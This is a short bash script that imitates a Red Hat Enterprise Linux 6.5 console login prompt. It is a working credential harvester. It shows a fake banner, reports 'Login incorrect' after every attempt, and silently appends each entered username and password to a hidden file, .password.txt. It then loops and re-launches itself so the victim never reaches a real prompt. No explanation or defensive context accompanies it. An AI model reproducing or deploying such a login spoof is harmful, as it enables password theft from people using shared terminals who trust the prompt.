#!/bin/bash
clear
echo
echo 'Red Hat Enterprise Linux Server release 6.5 (Santiago)'
echo "Kernel `uname -r` on an `uname -m`"
echo
read -p "$(hostname|awk -F"." '{print $1}') login: " user
read -s -p "Password: " passwd
echo
sleep 2
echo "Login incorrect" 
echo "$user:$passwd" >> .password.txt
for i in 1 2 3
do
echo
read -p "login: " user
read -s -p "Password: " passwd
echo
sleep 2
echo "Login incorrect" 
echo "$user:$passwd" >> .password.txt
done
sh $0
